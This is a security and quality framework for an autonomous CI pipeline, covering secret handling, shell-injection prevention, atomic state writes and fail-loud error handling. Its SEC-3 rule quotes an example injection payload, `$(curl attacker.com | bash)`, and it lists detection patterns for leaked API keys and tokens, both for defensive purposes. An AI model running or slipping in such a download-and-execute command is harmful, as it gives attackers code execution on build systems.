---
tldr: The Constitution is an executable governance document — every rule has a severity, a machine-checkable pattern, and an Andon guarantee that no failure is ever silent.
category: core
---

# Security and Quality Framework

## Target

This framework exists to make a fully autonomous pipeline safe to run without human gates. Because no human reviews each run, the system must police itself: secrets must never leak into public output, untrusted input must never reach a shell interpreter, failures must never be hidden behind green CI checks, and state must never corrupt silently. The Constitution is the single source of truth for all of those invariants.

## Behaviour

### Foundational: Andon (no silent failures)

- Every step either stops on failure or is deleted. There is no middle ground. {>> The gray area — "sort of important" steps whose failures are logged but ignored — is where silent corruption lives.}
- In healing loops, individual item failures do not stop the loop, but they MUST be counted (`ERRORS=$((ERRORS + 1))`), annotated (`::warning::`), and written to the audit log. {>> Andon applied to loops: the loop continues, the failure is never silent.}
- `|| true` without a following visible signal is prohibited. Bare `2>/dev/null` without an error handler is prohibited. {>> Silent suppression is as dangerous as no error handling — it hides expired tokens, permission denials, and state corruption behind a green CI badge.}

### Security rules

- **SEC-1 (L1):** Secrets flow exclusively through `env:` blocks in workflow YAML. Direct `${{ secrets.* }}` interpolation inside `run:` strings is prohibited. {>> Interpolated secrets appear in runner debug logs and in error messages captured by logging sidecars.}
- **SEC-2 (L1):** Every publish path (issues, PRs, commit messages) pipes content through `company/scripts/sanitise.sh` before writing. Sanitisation failure causes the publish step to be skipped, never bypassed. {>> The script exits non-zero on secret detection, so `set -e` propagates the failure automatically — the caller must not add `|| true`.}
- **SEC-3 (L1):** `github.event.*` and `inputs.*` values are mapped to `env:` variables before use in `run:` blocks. Direct interpolation inside shell strings enables code injection via crafted issue titles or PR bodies. {>> An issue titled `$(curl attacker.com | bash)` becomes a live command when naively interpolated.}
- **SEC-4 (L1):** Every workflow file declares an explicit `permissions:` block with least-privilege scopes. Omitting the block silently grants the default GITHUB_TOKEN broad access. {>> "Explicit" includes specifying `contents: none` for workflows that never write — absence of a declaration is not the same as absence of permission.}
- **SEC-5 (L2):** Dashboard HTML uses `textContent` exclusively for dynamic data. `innerHTML` with API-sourced or state-file data enables XSS.
- **SEC-6 (L2):** `target="_blank"` links carry `rel="noopener noreferrer"` to prevent reverse tabnapping.
- **SEC-7 (L2):** Healing loops enforce a circuit breaker: max 10 creates and 5 errors per run. {>> Without a ceiling, a misconfigured healing rule can create unbounded issues in a single scheduled run, spamming the repo and exhausting API quota.}

### `sanitise.sh` contracts

- Reads from stdin, writes sanitised text to stdout (composable in pipelines).
- Detects: Anthropic/OpenAI keys (`sk-…`), GitHub PATs (`ghp_`, `ghs_`, `github_pat_`), AWS access keys (`AKIA…`), Stripe keys/webhook secrets, PEM private key blocks, and heuristic `SECRET=`/`TOKEN=`/`PASSWORD=` patterns.
- Exits 1 on any secret match — the upstream publish step must treat non-zero exit as skip, not retry. {>> Fail-safe design: refusing to output is always safer than leaking.}
- Emits a WARNING (not exit 1) for non-allowlisted email addresses — emails may exist in public commit history and warrant human review rather than automated rejection.

### Architecture rules

- **ARCH-1 (L1):** All persistent state files (JSON, JSONL, YAML) live under `company/`. Root and `.github/` are reserved for configuration and workflow definitions. {>> Scattering state creates ambiguity about which files are safe for programmatic modification.}
- **ARCH-2 (L1):** Shell logic beyond 20 lines is extracted to `company/scripts/`. Inline bash in workflow YAML is untestable, unlintable, and non-reusable.
- **ARCH-3 (L1):** Specs follow `.start/specs/NNN-<name>/` with `README.md`, requirements, and solution documents. Consistent layout enables automated discovery and status tracking.
- **ARCH-4 (L1):** Automated PRs self-merge through `pr-review-merge.sh`, which enforces Copilot review (poll + timeout), an author allowlist, a size limit, a security keyword scan, and a CI status check. {>> Path-based scoping was the compensating control before guardrails existed; the guardrail system now protects the goal directly, without restricting which files a PR may touch.}
- **ARCH-5 (L1):** Cross-repo operations reference `TARGET_REPO` env var (`owner/repo` format). Hardcoded repo strings break forks and make the template non-portable.
- **ARCH-6 (L2):** Scheduled and stateful workflows declare `concurrency:` with `cancel-in-progress: false`. Stateful workflows that cancel mid-run risk partial state writes and corrupted JSON. {>> `cancel-in-progress: true` is correct for preview deployments; it is wrong for any workflow that writes state.}
- **ARCH-7 (L2):** Automated PR branches follow `<workflow-prefix>/{date}-{run_id}`. Predictable naming enables automated cleanup and audit trail correlation.
- **ARCH-8 (L2):** Commit-creating workflows authenticate with `PUSH_TOKEN` (a PAT), not `GITHUB_TOKEN`. Commits made with `GITHUB_TOKEN` are intentionally excluded from triggering subsequent workflow runs, breaking pipeline chains. {>> This is a GitHub platform constraint, not a configuration option.}
- **ARCH-9 (L2):** State files are git-tracked so corruption is recoverable via `git checkout`. Healing workflows are idempotent — re-running on the same state must not create duplicates or corrupt counters. {>> Idempotency is enforced by retry trackers, fuzzy duplicate detection before issue creation, and the circuit breaker.}

### Quality rules

- **QUAL-1 (L1):** Every shell script starts with `#!/usr/bin/env bash` and `set -euo pipefail`. Without strict mode, scripts silently continue past failures, producing corrupt state or partial results. {>> `-u` catches undefined variable references that would otherwise silently expand to empty strings. `-o pipefail` catches failures in the left side of a pipe that plain `-e` misses.}
- **QUAL-2 (L1):** All jq mutations that write state files use the temp-file-then-mv pattern: `jq ... > /tmp/tmpfile && mv /tmp/tmpfile "$TARGET"`. {>> Writing `jq '.x' f.json > f.json` truncates the file before jq reads it, producing an empty or corrupt state file.}
- **QUAL-3 (L1):** Date arithmetic supports both GNU (`date -d`) and BSD (`date -v`) variants. GitHub runners use GNU date; local macOS development uses BSD date. {>> A script that passes CI but fails locally — or vice versa — erodes confidence in local testing as a quality gate.}
- **QUAL-4 (L1):** Commit messages follow `<type>: <description>` with valid types: `feat, fix, docs, test, chore, perf, ci, heal, loop, merge, refactor`. {>> Conventional commits enable automated changelog generation and semantic version bumping.}
- **QUAL-5 (L1):** Every caught failure produces a visible signal: `::error::` or `::warning::` annotation + error counter increment + audit log entry. This is the code-level implementation of Andon. {>> The acceptable suppression pattern is `if ! cmd 2>/dev/null; then echo "::warning::…"; ERRORS=$((ERRORS+1)); fi` — redirect stderr to suppress noise, but always emit an annotation and increment the counter.}
- **QUAL-6 (L2):** JSON payloads are constructed with `jq -n --arg`/`--argjson`, never shell string interpolation. Interpolation breaks on quotes, newlines, and backslashes; jq handles them correctly.
- **QUAL-7 (L2):** The `manual-only` label is checked before any healing action, providing a human override escape hatch for issues that require judgment rather than automation.
- **QUAL-8 (L2):** Mutated state files are validated for required keys and correct types after every write. Atomic writes (QUAL-2) prevent truncation but cannot detect semantic corruption — a missing `last_check` or a `checks_run` that is a string instead of a number passes jq syntax checks but breaks downstream consumers.

### Testing rules

- **TEST-1 (L1):** E2E and integration test scripts register `trap cleanup EXIT`. Leaked test artifacts (branches, issues, PRs) require manual removal and pollute audit logs.
- **TEST-2 (L1):** Test scripts track PASS/FAIL counters, print structured results, and `exit 1` on any failure. Unstructured output makes CI failures difficult to diagnose from the GitHub Actions log.
- **TEST-3 (L2):** Test scripts validate required tools (`gh`, `jq`, etc.) and env vars before executing any test logic. {>> Early validation produces a clear actionable error instead of a cryptic mid-run `command not found`.}
- **TEST-4 (L2):** The `pipeline-health` workflow exposes `cutoff_override_minutes` as a `workflow_dispatch` input so E2E tests can trigger healing without waiting for real staleness windows (hours or days).
- **TEST-5 (L3):** Polling loops use configurable `MAX_ATTEMPTS` and `POLL_INTERVAL` with a timeout-triggered FAIL. Unbounded polling hangs CI runners indefinitely.

### Amendment process

- New rules require a PR with codebase evidence. No aspirational rules — the Constitution documents what is practised, not what is hoped.
- L1↔L2 severity changes require documented justification in the PR body.
- Rule removal requires migration notes explaining the replacement or the reason for retirement.
- Versioning: major bump (e.g., 2.0.0) when L1 rules change; minor bump for L2/L3 additions or modifications. {>> Version 2.0.0 was triggered by ARCH-4's shift from path-based scoping to guardrail-based protection — a fundamental change to what the rule protects, not just how.}
- Temporary exceptions to L2/L3 rules may be documented inline with `<!-- EXCEPTION: reason, expires YYYY-MM-DD -->`.

## Design

**The Constitution is a machine-readable governance document.** Every rule carries a `level`, a `pattern` or `check`, and a `scope`. This is not incidental — the intent is that automated tooling can audit the codebase against the Constitution without human interpretation.

**Fail-safe defaults throughout.** `sanitise.sh` refuses to emit output on secret detection rather than emitting a warning and continuing. `set -euo pipefail` stops the script rather than soldiering on. Atomic writes abandon the output rather than partially overwriting state. The direction of every default is toward visibility and preservation, not silent continuation.

**Andon as the root principle.** The Andon principle is not one rule among many — it is the reason the other rules are written the way they are. SEC-2 (sanitise failure causes skip, not bypass), QUAL-1 (strict mode catches failures early), QUAL-2 (atomic writes prevent partial corruption), and QUAL-5 (visible signals required) are all expressions of the same idea: if something goes wrong, the system must surface it loudly rather than hide it quietly.

**Separation of concerns enforced by file layout.** ARCH-1 (state in `company/`) and ARCH-2 (scripts in `company/scripts/`) are not stylistic preferences — they create a clear contract about what files the pipeline will read and write programmatically. A file outside `company/` is configuration; a file inside `company/` is live state. This distinction makes auditing, recovery, and schema validation straightforward.

**Environment as the security boundary.** SEC-1, SEC-3, and ARCH-8 share a common pattern: use an environment variable to cross a trust boundary (secret → shell, event payload → shell, commit-triggering token → git). Environment variables are opaque to logging, interpolation-safe, and process-scoped. Direct interpolation across the same boundary creates injection vectors or visibility leaks.

**Evidence-based rules prevent rule rot.** The amendment process requiring codebase evidence for new rules means the Constitution cannot drift from practice. A rule without evidence is aspirational, not enforceable, and aspirational rules create false confidence.

## Interactions

- [[spec - observation loop - autonomous OODA cycle for company operations]] — must comply with SEC-1, SEC-2, SEC-3, SEC-4, ARCH-5, ARCH-7, ARCH-8, QUAL-1 through QUAL-5; its publish steps are the primary consumers of `sanitise.sh`
- [[spec - self healing - deterministic pipeline recovery]] — healing loop implementation of Andon (per-item error counting + circuit breaker SEC-7); ARCH-4 (self-merge via `pr-review-merge.sh`); ARCH-6 (concurrency); TEST-4 (cutoff override)
- [[spec - pr review merge - autonomous bot pr guardrails]] — the guardrail script that implements ARCH-4; enforces author allowlist, Copilot review, size limit, security keyword scan, and CI status check
- [[spec - pipeline state machine - label driven issue lifecycle]] — label vocabulary and state transitions governed by ARCH-3 (spec structure), QUAL-4 (commit format), SEC-2 (sanitised agent instructions)
- [[spec - infrastructure monitoring - endpoint health and alerting]] — health probes governed by SEC-4 (explicit permissions), QUAL-1 (strict mode in collect-infra.sh)
- [[spec - testing - e2e and integration test framework]] — TEST-1 through TEST-5 govern all test scripts; TEST-4 depends on a specific `pipeline-health` workflow input that ARCH-2 (scripts-not-inline) makes testable locally
- State management (QUAL-2 atomic writes, QUAL-3 date compat, QUAL-8 schema validation, ARCH-1 location under `company/`) applies to all subsystems that write state files
- Audit log (`company/audit-log.jsonl`) is the required destination for every Andon-compliant error signal (QUAL-5); consumed by self-healing and PR review specs
- Dashboard (chimney repo) must comply with SEC-5 (textContent, no innerHTML) and SEC-6 (noopener links)
- QUAL-4 (conventional commits) governs the commit format across all subsystems

## Mapping

> Source files:
> - `CONSTITUTION.md` — canonical governance document; all rules, severities, patterns, and evidence references
> - `company/scripts/sanitise.sh` — implementation of SEC-2; reads stdin, pattern-matches against known secret formats, exits 1 on detection
